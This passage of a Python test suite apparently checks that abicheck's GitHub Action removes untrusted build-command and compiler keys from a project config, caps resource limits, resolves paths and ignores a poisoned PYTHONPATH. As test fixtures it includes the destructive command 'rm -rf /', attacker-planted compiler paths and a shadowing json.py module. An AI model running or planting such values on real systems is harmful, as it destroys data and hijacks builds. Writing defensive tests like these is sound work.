        assert "query" not in doc.get("build", {})
        assert doc["build"] == {"system": "cmake"}
        assert "build.query" in result.stderr

    def test_discovered_compile_compiler_is_stripped(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  compiler: /tmp/attacker-planted-cc\n  std: c++20\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert "compiler" not in doc.get("compile", {})
        assert doc["compile"] == {"std": "c++20"}
        assert "compile.compiler" in result.stderr

    def test_both_dangerous_keys_stripped_together(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "build:\n  query: 'rm -rf /'\ncompile:\n  compiler: /malicious/cc\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert "query" not in doc.get("build", {})
        assert "compiler" not in doc.get("compile", {})
        # No dangerous value leaked into the merged document at all.
        serialized = json.dumps(doc)
        assert "rm -rf" not in serialized
        assert "/malicious/cc" not in serialized

    def test_discovered_build_compile_db_is_stripped(self, tmp_path: Path) -> None:
        """A different concern from build.query/compile.compiler above (a
        trust/execution gate) -- this key is harmless in itself, but
        abicheck/buildsource/embed.py's compile_db_explicit is derived from
        "was *any* --config passed", not from where this one field's value
        came from. Forwarding it into this always-explicit overlay would
        silently promote a stale/inapplicable discovered build.compile_db
        to "explicit" status (its miss must surface, never falling through
        to inference) purely because an unrelated Action input triggered
        this overlay synthesis (Codex review, fresh evidence)."""
        (tmp_path / ".abicheck.yml").write_text(
            "build:\n  compile_db: /stale/compile_commands.json\n  system: cmake\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert "compile_db" not in doc.get("build", {})
        assert doc["build"] == {"system": "cmake"}
        assert "build.compile_db" in result.stderr

    def test_discovered_resource_limits_raise_is_capped(self, tmp_path: Path) -> None:
        """Codex review, PR #1174, third round: forwarding this key via
        --config would launder it into operator-authorized-to-raise status,
        the same risk as build.query/compile.compiler. Capped, not
        stripped: a lower value (the sibling test below) is no risk."""
        (tmp_path / ".abicheck.yml").write_text(
            "resource_limits:\n  max_bundle_facts_decode_nodes: 50000000\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["resource_limits"]["max_bundle_facts_decode_nodes"] == 1_000_000
        assert "resource_limits.max_bundle_facts_decode_nodes" in result.stderr

    def test_discovered_resource_limits_lower_value_survives(
        self, tmp_path: Path
    ) -> None:
        """Narrowing the budget below the default is never a decode-bomb
        risk, so it passes through uncapped -- unlike build.query/
        compile.compiler, which are always stripped regardless of value."""
        (tmp_path / ".abicheck.yml").write_text(
            "resource_limits:\n  max_bundle_facts_decode_nodes: 1\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["resource_limits"]["max_bundle_facts_decode_nodes"] == 1
        assert "resource_limits.max_bundle_facts_decode_nodes" not in result.stderr


class TestReleaseTopologyOverlayResolvesRelativePathsAgainstRealProjectRoot:
    """Codex review, PR #1159 (P1, correctness): a relative
    ``compile.include_dirs`` entry in the discovered config must resolve
    against that config's own project root, not against wherever the
    ``mktemp`` scratch overlay file happens to be written (typically
    under ``/tmp``) -- else headers silently disappear from extraction."""

    def test_relative_include_dir_resolves_against_project_root_not_tmp(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / "include").mkdir()
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  include_dirs: [include]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        resolved = doc["compile"]["include_dirs"]
        assert resolved == [str((tmp_path / "include").resolve())]
        # Explicitly not resolved against the scratch file's own directory.
        assert not resolved[0].startswith("/tmp") or resolved[0].startswith(
            str(tmp_path.resolve())
        )

    def test_multiple_relative_include_dirs_all_resolve(self, tmp_path: Path) -> None:
        (tmp_path / "a").mkdir()
        (tmp_path / "b").mkdir()
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  include_dirs: [a, b]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["compile"]["include_dirs"] == [
            str((tmp_path / "a").resolve()),
            str((tmp_path / "b").resolve()),
        ]

    def test_absolute_include_dir_is_left_unchanged(self, tmp_path: Path) -> None:
        abs_dir = str((tmp_path / "somewhere").resolve())
        (tmp_path / ".abicheck.yml").write_text(
            f"compile:\n  include_dirs: [{abs_dir}]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["compile"]["include_dirs"] == [abs_dir]


class TestReleaseTopologyOverlayFailsLoudOnMalformedDiscoveredConfig:
    """Codex review, PR #1159 (P2): a malformed/unreadable discovered
    ``.abicheck.yml`` must fail the Action step loudly -- matching the
    ordinary CLI's own ``discover_project_config()`` behavior -- rather
    than silently proceeding as if no project config existed."""

    def test_malformed_yaml_fails_the_step(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "release: [unterminated\n", encoding="utf-8"
        )
        result = _run_bash_script(_harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode != 0
        assert "failed to parse the discovered project config" in result.stderr
        assert "failed to merge" in result.stdout
        # Must not silently write a merged overlay and proceed.
        assert "--config" not in result.stdout


class TestReleaseTopologyOverlayResolvesRelativeBuildConfigAgainstRealCwd:
    """Codex review, PR #1159 (P1, third round): ``build-config`` is
    normally a checkout-relative path (``build-config: .abicheck.yml`` or
    ``build-config: config/ci.yml``, the natural way a workflow names it).
    The merge helper's Python invocation runs inside ``(cd
    "$_PY_SAFE_DIR" && ...)`` -- a scratch directory wholly unrelated to the
    Action's real working directory -- so a *relative* ``base_source``
    handed straight into that subprocess used to resolve
    (``Path(base_source).resolve()``) against ``$_PY_SAFE_DIR`` instead of
    the real checkout, failing with "does not exist" even though the file
    is right there and the identical relative path works fine when passed
    straight to the native CLI (which never changes directory).

    These tests must exercise a genuine relative-vs-absolute distinction --
    not a relative path that happens to already sit under ``$_PY_SAFE_DIR``
    or under the test process's own cwd by coincidence. ``_run_bash_script``
    is invoked with ``cwd=tmp_path`` (the Action's simulated real working
    directory) while ``$_PY_SAFE_DIR`` is a *different*, freshly-``mktemp
    -d``-ed directory elsewhere (real ``mktemp -d`` still runs for real, see
    ``_harness``'s own docstring) -- exactly the same mismatch a real Action
    step has between its checkout and this script's isolation directory.
    """

    def test_relative_build_config_resolves_against_action_cwd_not_py_safe_dir(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "severity:\n  abi_breaking: error\n", encoding="utf-8"
        )
        # A checkout-relative path, exactly how a workflow would spell
        # `build-config: .abicheck.yml`. $_PY_SAFE_DIR (an unrelated mktemp
        # -d directory) has no such file, so without the fix this resolves
        # to the wrong place and fails "does not exist".
        script = _release_topology_script_with_preexisting_config_flag(".abicheck.yml")
        result = _run_bash_script(
            script,
            {"INPUT_DSO_ONLY": "true", "INPUT_BUILD_CONFIG": ".abicheck.yml"},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        assert "does not exist" not in result.stderr
        lines = result.stdout.splitlines()
        assert lines.count("--config") == 1
        doc = _read_config_overlay(lines)
        assert doc["severity"] == {"abi_breaking": "error"}
        assert doc["release"] == {"dso_only": True}

    def test_nested_relative_build_config_resolves_against_action_cwd(
        self, tmp_path: Path
    ) -> None:
        config_dir = tmp_path / "config"
        config_dir.mkdir()
        (config_dir / "ci.yml").write_text(
            "scope:\n  on_incomplete: block\n", encoding="utf-8"
        )
        script = _release_topology_script_with_preexisting_config_flag("config/ci.yml")
        result = _run_bash_script(
            script,
            {
                "INPUT_FAIL_ON_REMOVED_LIBRARY": "true",
                "INPUT_BUILD_CONFIG": "config/ci.yml",
            },
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        assert "does not exist" not in result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["scope"] == {"on_incomplete": "block"}
        assert doc["gate"] == {"fail_on_removed_library": True}


class TestReleaseTopologyOverlayPreservesWindowsQualifiedBuildConfigPath:
    """Codex review, PR #1159 (P1, fourth round): the merge helper's
    ``base_source`` absolutization used to test ``[[ "$base_source" != /*
    ]]`` -- POSIX-only, so a genuine Windows-qualified path (a drive letter
    like ``C:\\...``, a UNC path ``\\\\server\\share\\...``, or a
    root-relative ``\\foo``) was misclassified as relative and got a
    spurious ``$PWD/`` prefix prepended, producing a malformed path that
    then failed inside the isolated Python subprocess even though the
    identical path already works fine when passed straight to the native
    CLI. The fix reuses ``_is_path_already_qualified`` -- the same helper
    ``$_PY_BIN`` canonicalization and ``_report_query``'s path anchoring
    already use -- which recognizes these Windows-only forms, but only when
    ``$OSTYPE`` indicates a Windows host (Git Bash/MSYS reports ``msys``);
    exercised here by forcing ``$OSTYPE`` rather than relying on whatever
    platform actually runs this test (mirrors
    ``test_action_run_sh_severity_summary.py::TestReportPathAnchoring``'s
    own established pattern for the identical helper).

    These tests exercise just the absolutization if-block in isolation
    (``_base_source_absolutize_source``), not the full merge -- a
    synthetic Windows path has no real file behind it on this (Linux) test
    runner, so running it through the full merge would fail on "does not
    exist" for either branch and, worse, let Python's own
    ``Path(...).resolve()`` re-derive an absolute path from a relative one,
    masking exactly the bash-level distinction this test needs to observe.
    """

    def _absolutize(self, base_source: str, cwd: Path, *, windows: bool) -> str:
        script = (
            "#!/usr/bin/env bash\nset -uo pipefail\n"
            + _path_qualified_helper_source()
            + '\nbase_source="$TEST_BASE_SOURCE"\n'
            + _base_source_absolutize_source()
            + 'printf "%s" "$base_source"\n'
        )
        # `$OSTYPE` is forced explicitly (see class docstring) so both
        # branches are exercised regardless of the host actually running
        # this test.
        result = _run_bash_script(
            script,
            {
                "OSTYPE": "msys" if windows else "linux-gnu",
                "TEST_BASE_SOURCE": base_source,
            },
            cwd=cwd,
        )
        assert result.returncode == 0, result.stderr
        return result.stdout

    def test_windows_drive_path_is_not_prefixed_with_pwd(self, tmp_path: Path) -> None:
        windows_path = "C:/Users/runner/work/repo/config.yml"
        result = self._absolutize(windows_path, tmp_path, windows=True)
        assert result == windows_path

    def test_windows_unc_path_is_not_prefixed_with_pwd(self, tmp_path: Path) -> None:
        unc_path = r"\\server\share\config.yml"
        result = self._absolutize(unc_path, tmp_path, windows=True)
        assert result == unc_path

    def test_windows_root_relative_path_is_not_prefixed_with_pwd(
        self, tmp_path: Path
    ) -> None:
        root_relative = r"\foo\config.yml"
        result = self._absolutize(root_relative, tmp_path, windows=True)
        assert result == root_relative

    def test_same_drive_letter_shaped_path_is_prefixed_on_non_windows(
        self, tmp_path: Path
    ) -> None:
        """The identical text is a genuine POSIX-relative filename on a
        non-Windows host (e.g. a file literally named ``C:`` is unusual but
        legal on Linux/macOS) -- ``$OSTYPE`` gating means it still gets the
        ``$PWD/`` prefix there, unlike the Windows-forced case above."""
        posix_like = "C:/Users/runner/work/repo/config.yml"
        result = self._absolutize(posix_like, tmp_path, windows=False)
        assert result == f"{tmp_path}/{posix_like}"

    def test_ordinary_relative_path_still_gets_pwd_prefix_on_windows(
        self, tmp_path: Path
    ) -> None:
        """A genuinely relative path (no drive/UNC/root-relative form) must
        still be absolutized even when ``$OSTYPE`` is Windows -- the fix
        must not accidentally widen "already qualified" beyond the real
        Windows-qualified forms."""
        relative = ".abicheck.yml"
        result = self._absolutize(relative, tmp_path, windows=True)
        assert result == f"{tmp_path}/{relative}"


class TestReleaseTopologyOverlayGenerationIsIsolated:
    """Codex review, PR #1159 (P1, fourth round): ``add_release_topology_
    config_flags``'s own overlay-generation step used to launch a bare
    ``python3`` from the checked-out repository instead of the resolved,
    isolated ``$_PY_BIN``/``$_PY_SAFE_DIR`` interpreter (with ``PYTHONPATH``
    cleared) every other inline-Python invocation in this file uses --
    including the merge helper this same function calls immediately
    afterward. Two independent, concrete signals distinguish "isolated"
    from "bare python3 from checkout" in this codebase (mirrors
    ``test_file_fingerprint_uses_python_startup_isolation`` in
    ``test_action_run_sh_py_safe_path.py``, the established static-source
    check for this exact property, plus a dynamic proof the static check
    alone can't give):

    1. Static: the function's own source text must invoke
       ``PYTHONPATH= "$_PY_BIN"`` from inside a ``(cd "$_PY_SAFE_DIR" &&
       ...)`` subshell, and must never invoke a bare ``python3``/``python``.
    2. Dynamic: a poisoned ``PYTHONPATH`` entry that breaks ``import json``
       must NOT affect overlay generation -- proving ``PYTHONPATH`` really
       is cleared for this invocation at runtime, not merely mentioned in
       the source text.
    """

    def test_source_uses_isolated_interpreter_not_bare_python3(self) -> None:
        fn_source = _add_release_topology_config_flags_source()
        assert '(cd "$_PY_SAFE_DIR"' in fn_source
        assert 'PYTHONPATH= "$_PY_BIN" -' in fn_source
        # No bare `python3`/`python` invocation anywhere in this function --
        # every interpreter launch goes through the resolved `$_PY_BIN`.
        for line in fn_source.splitlines():
            stripped = line.strip()
            assert not stripped.startswith("python3 ") and stripped != "python3"
            assert not stripped.startswith("python ") and stripped != "python"

    def test_overlay_generation_ignores_a_poisoned_pythonpath(
        self, tmp_path: Path
    ) -> None:
        poison_dir = tmp_path / "poison"
        poison_dir.mkdir()
        # A `json.py` shadowing the stdlib module: if this function's own
        # Python invocation inherited $PYTHONPATH instead of clearing it,
        # `import json` would pick this up and crash instead of the real
        # stdlib module the overlay-generation script needs.
        (poison_dir / "json.py").write_text(
            "raise ImportError('POISONED: PYTHONPATH leaked into an "
            "isolated invocation')\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(),
            {"INPUT_DSO_ONLY": "true", "PYTHONPATH": str(poison_dir)},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        assert "POISONED" not in result.stderr
        lines = result.stdout.splitlines()
        doc = _read_config_overlay(lines)
        assert doc == {"release": {"dso_only": True}}


class TestReleaseTopologyOverlayCanonicalizesRelativeTmpdir:
    """Codex review, PR #1159 (P2, sixth round): on a runner where
    ``$TMPDIR`` itself holds a relative value, ``mktemp`` returns a
    relative ``overlay`` path. The merge helper writes to (and, for
    discover mode, later reads back from) that path from inside a
    ``(cd "$_PY_SAFE_DIR" && ...)`` subshell -- a relative path there
    resolves against the wrong directory, making a valid compile/topology
    Action request fail with a spurious "does not exist" before abicheck
    ever runs. ``overlay`` is now canonicalized via ``_mktemp_canonical``
    immediately after creation, the same fix already applied to
    ``$BASELINE_DIR`` (``test_action_run_sh_baseline_set_fallback.py``'s
    own ``test_resolves_with_a_relative_tmpdir``).
    """

    def test_overlay_generation_succeeds_under_a_relative_tmpdir(
        self, tmp_path: Path
    ) -> None:
        relative_tmpdir = "relative_tmp"
        (tmp_path / relative_tmpdir).mkdir()
        result = _run_bash_script(
            _harness(),
            {"INPUT_DSO_ONLY": "true", "TMPDIR": relative_tmpdir},
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        assert "does not exist" not in result.stderr
        lines = result.stdout.splitlines()
        doc = _read_config_overlay(lines)
        assert doc == {"release": {"dso_only": True}}
        # The --config entry itself must be an absolute path -- a relative
        # one here is exactly the bug: it would have resolved correctly
        # from the CLI's own real invocation directory, but not from
        # inside the merge helper's `$_PY_SAFE_DIR` subshell.
        config_idx = lines.index("--config")
        assert Path(lines[config_idx + 1]).is_absolute(), lines
